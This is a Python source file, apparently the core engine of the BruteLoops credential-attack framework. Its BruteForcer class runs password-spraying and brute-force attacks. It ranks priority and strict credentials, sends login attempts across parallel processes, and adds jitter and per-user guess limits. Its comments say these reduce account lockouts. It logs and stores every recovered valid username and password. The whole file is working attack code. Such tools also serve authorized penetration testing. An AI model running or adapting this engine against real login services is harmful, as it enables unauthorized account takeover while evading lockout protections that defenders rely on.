#!/usr/bin/env python3

from . import logging
from .brute_time import BruteTime
from . import sql
from .config import Config
from .db_manager import *
from sqlalchemy import (
    select,
    delete,
    join,
    update,
    not_)
from sqlalchemy.orm.session import close_all_sessions
from pathlib import Path
from uuid import uuid4
from collections import namedtuple
from copy import deepcopy
from time import sleep,time
from types import FunctionType, MethodType
import traceback
import re
import signal
from time import time
from random import shuffle

UNKNOWN_PRIORITIZED_USERNAME_MSG = \
    'Prioritized username value supplied ' \
    'during configuration that does not a' \
    'ppear in the database. Insert this v' \
    'alue or remove it from the configura' \
    'tion: {username}'

UNKNOWN_PRIORITIZED_PASSWORD_MSG = \
    'Prioritized password value supplied ' \
    'during configuration that does not a' \
    'ppear in the database. Insert this v' \
    'alue or remove it from the configura' \
    'tion: {password}'

def id_query(q):
    return [v.id for v in q]

class BruteForcer:
    '''Base object from which all other brute forcers will inherit.
    Provides all basic functionality, less brute force logic.
    '''

    def __init__(self, config, use_billiard=False):
        '''Initialize the BruteForcer object, including processes.

        - config - A BruteLoops.config.Config object providing all
        configuration parameters to proceed with the attack.
        '''

        if not config.validated: config.validate()

        # DB SESSION FOR MAIN PROCESS
        self.main_db_sess = config.session_maker.new()
        self.handler_db_sess = config.session_maker.new()

        # ==============================
        # BASIC CONFIGURATION PARAMETERS
        # ==============================

        self.config   = config
        self.presults = []
        self.pool     = None
        self.attack   = None
        self.log   = logging.getLogger(
            name='BruteLoops.BruteForcer',
            log_level=config.log_level,
            log_file=config.log_file,
            log_stdout=config.log_stdout,
            log_stderr=config.log_stderr)

        self.log.general(f'Initializing {config.process_count} process(es)')
        
        # ===================================
        # LOG ATTACK CONFIGURATION PARAMETERS
        # ===================================

        self.log.general('Logging attack configuration parameters')

        config_attrs = [
                'authentication_jitter',
                'max_auth_jitter',
                'max_auth_tries',
                'stop_on_valid',
                'db_file',
                'log_file',
                'log_level',
                'log_stdout',
                'log_stderr',
                'randomize_usernames'
        ]

        for attr in config_attrs:
            self.log.general(f'Config Parameter -- {attr}: '+str(getattr(self.config,attr)))

        if hasattr(self.config.authentication_callback, 'callback_name'):
            self.log.general(f'Config Parameter -- callback_name: '+ \
                            getattr(self.config.authentication_callback,
                                'callback_name'))
            
        # =============================================================
        # REASSIGN DEFAULT SIGNAL HANDLER AND INITIALIZE A PROCESS POOL
        # =============================================================

        original_sigint_handler = signal.signal(signal.SIGINT,signal.SIG_IGN)

        if use_billiard:

            import billiard
            self.pool = billiard.Pool(processes=config.process_count)

        else:

            from multiprocessing.pool import Pool

            self.pool = Pool(processes=config.process_count)

        if not KeyboardInterrupt in self.config.exception_handlers:

            def handler(sig,exception):
                print('SIGINT Captured -- Shutting down ' \
                      'attack\n')
                self.shutdown()
                print('Exiting')
                exit(sig)

            self.config.exception_handlers[KeyboardInterrupt] = handler

        if KeyboardInterrupt in self.config.exception_handlers:

            sigint_handler = config.exception_handlers[KeyboardInterrupt]

            sigint_class = sigint_handler.__class__

            if sigint_class != MethodType and sigint_class != FunctionType:

                assert '__call__' in sigint_handler.__dict__, (
                    'Exception handler must implement __call__'
                )

                call_class = sigint_handler.__getattribute__('__call__').__class__

                assert call_class == FunctionType or call_class == MethodType, (
                    '__call__ must be of type FunctionType or MethodType'
                )

            signal.signal(signal.SIGINT, sigint_handler)


        else: signal.signal(signal.SIGINT, original_sigint_handler)

        # =================
        # HANDLE THE ATTACK
        # =================
        
        current_time = BruteTime.current_time(format=str)
        self.log.general(f'Beginning attack: {current_time}')

        # CREATE A NEW ATTACK
        self.attack = sql.Attack(start_time=BruteTime.current_time())
        self.main_db_sess.add(self.attack)
        self.main_db_sess.commit()

        self.config = config

        # Realign future jitter times with the current configuration
        self.realign_future_time()

    def handle_outputs(self, outputs):
        '''Handle outputs from the authentication callback. It expects a list of
        tuples/lists conforming to the following format:

        ```
        outputs = [{
                'outcome': int,
                'username': str,
                'password': str,
                'actionable': bool,
                'events': [str]
            }]
        ```

        In the structure below:

        - `OUTCOME` - is an integer value indicating if authentication was
        successful (-1 for "incomplete", 1 for true, 0 for false)
        - `USERNAME` - string value of the username
        - `PASSWORD` - string value of the password
        - `ACTIONABLE` - Boolean value determining if the record should be disabled.
        '''

        # ==================================================
        # DETERMINE AND HANDLE VALID_CREDENTIALS CREDENTIALS
        # ==================================================

        recovered = False
        for output in outputs:

            # Stop being lazy
            # Make this a named tuple, or something
            outcome = output.get('outcome', 0)
            username = output.get('username', None)
            password = output.get('password', None)
            actionable = output.get('actionable', True)
            events = output.get('events', [])

            # ===============================
            # QUERY FOR THE TARGET CREDENTIAL
            # ===============================

            credential = self.handler_db_sess \
                    .query(sql.Credential) \
                    .join(sql.Username) \
                    .join(sql.Password) \
                    .filter(
                        sql.Username.value == username,
                        sql.Password.value == password,
                        sql.Username.recovered == False) \
                    .first()

            if not credential: continue

            # ======================
            # HANDLE THE CREDENTIALS
            # ======================

            if self.config.max_auth_jitter:

                # =====================
                # SET FUTURE TIME AGAIN
                # =====================
                '''
                - Set once before, just before making the guess.
                - Mitigates likelihood of locking out accounts.
                '''

                credential.username.future_time = \
                    self.config.max_auth_jitter.get_jitter_future()

            cred = f'{output["username"]}:{output["password"]}'

            # Handle valid credentials
            if outcome == 1:

                credential.guessed=True

                recovered = True
                self.log.valid(cred)

                # Update username to "recovered"
                credential.username.recovered=True

                # Update the credential to valid
                credential.valid=True

            # Guess failed for some reason
            elif outcome == -1:

                self.log.general(
                    f'Failed to guess credential. - {cred}')

            # Credentials are no good
            else: 

                credential.guessed=True

                # Update the credential to invalid
                credential.valid=False
                self.log.invalid(cred)

            # ================================================
            # MANAGE THE ACTIONABLE ATTRIBUTE FOR THE USERNAME
            # ================================================
    
            if actionable and not credential.username.actionable:
                credential.username.actionable = True
            elif not actionable and credential.username.actionable:
                self.log.invalid_username(
                    f'Disabling invalid username - {cred}')
                credential.username.actionable = False
    
            # ===================
            # WRITE MODULE EVENTS
            # ===================
    
            if events and isinstance(events, list):
                for event in events:
                    self.log.module(event)

        # Commit the changes
        self.handler_db_sess.commit()

        return recovered

    def realign_future_time(self):
        '''Iterate over each imported username value and rejitter
        the future time based on the current max_authentication_jitter
        '''
        
        # Get all relevant username values
        usernames = self.main_db_sess.query(sql.Username) \
                .filter(
                    sql.Username.recovered == False,
                    sql.Username.last_time > -1.0,
                )

        # Iterate over each username
        for username in usernames:

            # If there's a max_auth_jitter configuration
            if self.config.max_auth_jitter:

                # Generate a new jitter value
                username.future_time = \
                    self.config.max_auth_jitter.get_jitter_future(
                                current_time=username.last_time
                            )

            # Otherwise, set it to the default value of -1.0
            else: username.future_time = -1.0

        # Commit the changes to the database
        self.main_db_sess.commit()

    def monitor_processes(self,ready_all=False):
        '''Iterate over each process in ```self.presults``` and wait
        for a process to complete execution. ```ready_all```
        indciates that monitoring will continue looping until all
        processes complete execution, otherwise a list of outputs
        will be returned after a single process is finished.

        Returns a list of output objects from the
        ```self.authentication_callback``` function and the first
        three elements should follow the pattern below:

        ```
        output = [
            0,        # indicator of successful authentication; 0=failure, 1=success
            username, # string representing the username used during authentication
            password  # string representing the password used during authentication
        ]
        ```
        '''
       
        outputs = []
        while True:

            # iterate over each result
            for result in self.presults:
                
                # act on results that are ready
                if result.ready():

                    # append outputs from the result
                    outputs.append(
                        result.get()
                    )

                    # remove the finished result
                    del(
                        self.presults[
                                self.presults.index(result)
                            ]
                        )

            # keep iterating should all results be cleared
              # and some still remain
            if (ready_all and self.presults) or (
                    len(self.presults) == self.config.process_count):
                sleep(.1)
                continue
            else:
                return outputs


    def do_authentication_callback(self, username, password, stop_on_valid=False, 
            *args, **kwargs):
        '''
        Call the authentication callback from a distinct process. Will monitor
        processes for completion if all are currently occupied with a previous
        callback request.
        '''

        '''
        When the maximum number of processes have been engaged
        to make authentication requests, call monitor_processes
        to watch each process until authentication finishes.

        Once completeds, the outputs are passed to handle_outputs,
        which is responsible for logging the outcome of the authentication
        request and updating the proper SQL record with the outcome.
        '''

        recovered = False
        if len(self.presults) == self.config.process_count:

            # monitor result objects
            outputs = self.monitor_processes()
            recovered = self.handle_outputs(outputs)

        if recovered and stop_on_valid:
            return recovered

        # initiate a brute in a process within the pool
        self.presults.append(
            self.pool.apply_async(
                self.config.authentication_callback,
                (
                    (username,password,)
                )
            )
        )

        return recovered

    def shutdown(self):
        '''Close & join the process pool, followed by closing input/output files.
        '''

        # =====================
        # LOG ATTACK COMPLETION
        # =====================

        self.log.general('Shutting attack down')

        self.attack.complete = True
        self.attack.end_time = BruteTime.current_time()
        self.main_db_sess.commit()

        self.log.general('Closing/joining Processes')

        if self.pool:
            self.pool.close()
            self.pool.join()

        close_all_sessions()


    def launch(self):
        """Launch a horitontal brute force attack.
        """

        if self.config.max_auth_tries:
            # Handle manually configured lockout threshold
            glimit = guess_limit = self.config.max_auth_tries
        else:
            # Set a sane default otherwise
            glimit = guess_limit = 1

        ulimit = user_limit = self.config.process_count
      
        sleeping  = False # determine if the brute attack is sleeping
        recovered = False # track if a valid credentials has been recovered

        # ========================
        # BEGIN BRUTE FORCE ATTACK
        # ========================

        while True:

            try:

                # =======================
                # GET GUESSABLE USERNAMES
                # =======================
                '''Get a list of guessable usernames. Prioritize by:

                1. priority specifications
                2. Whether or not strict credentials have been set for
                the user
                '''
               
                # Get a list of usernames to target
                    # must not have already been recovered during an earlier attack
                    # future_time must be less than current time
                        # for that user have been completed

                # ==================
                # PRIORITY USERNAMES
                # ==================

                self.main_db_sess.commit()

                uids = [u.username_id for u in self.main_db_sess.query(sql.PriorityUsername)
                    .join(sql.Username)
                    .join(sql.Credential)
                    .filter(
                        sql.Username.recovered == False,
                        sql.Username.future_time <= time(),
                        sql.Username.actionable == True,
                        sql.Credential.guessed == False)
                    .limit(ulimit)]

                ucount = len(uids)
                if ucount < ulimit:

                    # =================================
                    # USERNAMES WITH STRICT CREDENTIALS
                    # =================================

                    uids += [sc.credential.username_id for sc in
                            self.main_db_sess.query(sql.StrictCredential)
                                .join(sql.Credential)
                                .join(sql.Username)
                                .filter(
                                    sql.Username.id.not_in(uids),
                                    sql.Username.recovered == False,
                                    sql.Username.priority == False,
                                    sql.Username.future_time <= time(),
                                    sql.Username.actionable == True,
                                    sql.Credential.guessed == False)
                                .limit(ulimit-ucount)]

                ucount = len(uids)
                if ucount < ulimit:

                    # ====================================
                    # USERNAMES WITH GUESSABLE CREDENTIALS
                    # ====================================

                    uids += [
                        u.id for u in self.main_db_sess.query(sql.Username)
                            .join(sql.Credential)
                            .filter(
                                sql.Username.id.not_in(uids),
                                sql.Username.recovered == False,
                                sql.Username.priority == False,
                                sql.Username.future_time <= time(),
                                sql.Username.actionable == True,
                                sql.Credential.strict == False,
                                sql.Credential.guessed == False)
                            .limit(ulimit-ucount)
                    ]


                if self.config.randomize_usernames:
                    shuffle(uids)

                # Logging sleep events
                if not uids and not sleeping:

                    u = self.main_db_sess.query(sql.Username) \
                        .filter(sql.Username.recovered == 0) \
                        .order_by(sql.Username.future_time.desc()) \
                        .limit(1) \
                        .first()

                    sleeping = True

                    if u and u.future_time > 60+time():
                        self.log.general(
                            f'Sleeping until {BruteTime.float_to_str(u.future_time)}'
                        )

                elif uids and sleeping:

                    sleeping = False

                # =========================
                # BRUTE FORCE EACH USERNAME
                # =========================
  
                # Current limit will be used to calculate the limit of the current query
                 # used to assure that the limit remains lesser than the greatest password
                 # id
                for uid in uids:

                    # ================================
                    # GET CREDENTIALS FOR THE USERNAME
                    # ================================

                    # Strict credentials
                    cids = [
                            sc.credential_id for sc in 
                                self.main_db_sess.query(sql.StrictCredential)
                                    .join(sql.Credential)
                                    .filter(
                                        sql.Credential.username_id == uid,
                                        sql.Credential.strict == True,
                                        sql.Credential.guess_time == -1)
                                    .limit(glimit)
                            ]

                    # Priority credentials
                    count = len(cids)
                    if count < glimit:

                        cids += [
                            c.id for c in self.main_db_sess.query(sql.Credential)
                                .join(sql.PriorityPassword)
                                .filter(
                                    sql.Credential.guess_time == -1,
                                    sql.Credential.username_id == uid,
                                    sql.Credential.strict == False,
                                    sql.Credential.id.not_in(cids)
                                )
                                .limit(glimit-count)
                        ]

                    # Standard spray credentials
                    count = len(cids)
                    if count < glimit:

                        cids += [
                            c.id for c in self.main_db_sess.query(sql.Credential)
                            .join(sql.Password)
                            .filter(
                                sql.Credential.guess_time == -1,
                                sql.Credential.username_id == uid,
                                sql.Credential.id.not_in(cids),
                                sql.Password.priority == False)
                            .limit(glimit-count)
                        ]

                    credentials = self.main_db_sess.query(sql.Credential) \
                        .filter(sql.Credential.id.in_(cids)) \
                        .all()

                    shuffle(credentials)

                    # Avoid race condition
                    #if credentials[0].username.recovered:
                    #    continue 

                    for credential in credentials:

                        # =================
                        # DO AUTHENTICATION
                        # =================
   
                        # Current time of authentication attempt
                        ctime = BruteTime.current_time()

                        # Get the future time when this user can be targeted later
                        if self.config.max_auth_jitter:
                            # Derive from the password jitter
                            ftime = self.config.max_auth_jitter.get_jitter_future()
                        else:
                            # Default effectively asserting that no jitter will occur.
                            ftime = -1.0

                        # Avoid race condition
                            # also prevents checking of additional passwords if a valid
                            # password has been recovered in the distinct process
                        if credential.username.recovered:
                            self.log.general(
                                'Skipping recovered credentials: '
                                '{username}:{password}'
                                .format(
                                    username=credential.username.value,
                                    password=credential.password.value))
                            continue

                        # Update the Username/Credential object with relevant
                        # attributes and commit

                        credential.guess_time=ctime
                        credential.username.last_time=ctime
                        credential.username.future_time=ftime
                        self.main_db_sess.commit()

                        # Do the authentication callback
                        recovered = self.do_authentication_callback(
                            credential.username.value,
                            credential.password.value
                        )

                        if recovered and self.config.stop_on_valid:
                            break

                    if recovered and self.config.stop_on_valid:
                        break

                # ============================================
                # STOP ATTACK DUE TO STOP_ON_VALID_CREDENTIALS
                # ============================================
                if recovered and self.config.stop_on_valid:
                        self.log.general(
                            'Valid credentials recovered. Exiting per ' \
                            'stop_on_valid configuration.',
                        )
                        self.shutdown()
                        break

                # ===============================================
                # CONTINUE LOOPING UNTIL ALL GUESSES ARE FINISHED
                # ===============================================

                # Check if a normal credentials remains
                sample_remaining = self.main_db_sess \
                    .query(sql.Username) \
                    .join(sql.Credential) \
                    .filter(sql.Username.recovered == False,
                            sql.Username.actionable == True,
                            sql.Credential.guessed == False) \
                    .limit(1) \
                    .first()

                if sample_remaining:

                    if len(self.presults):
                        outputs = self.monitor_processes()
                        self.handle_outputs(outputs)

                    sleep(.2)
                    continue

                # ========================================
                # GUESSES FINISHED; CLEAN REMAINING OUTPUT
                # ========================================

                outputs = self.monitor_processes(ready_all=True)
                self.handle_outputs(outputs)
                self.log.general('Attack finished')
    
                # ========
                # SHUTDOWN
                # ========
   
                self.shutdown()
                break
                
            # ==================
            # EXCEPTION HANDLING
            # ==================
    
            except Exception as e:
    
                # =========================
                # DEFAULT EXCEPTION HANDLER
                # =========================
                #
                # - check if an exception handler has been provided for
                #   a given exception class
                # - if not, then shut down the brute forcer and raise
                #   the exception for the caller to handle
    
                # Allow registered handlers to trigger
                if e in self.config.exception_handlers:
    
                    self.config.exception_handlers[e](self)
    
                # Raise to caller
                else:

                    self.log.general(
                        'Unhandled exception occurred. Shutting down attack '\
                        'and returning control to the caller.'
                    )

                    self.shutdown()
                    raise e
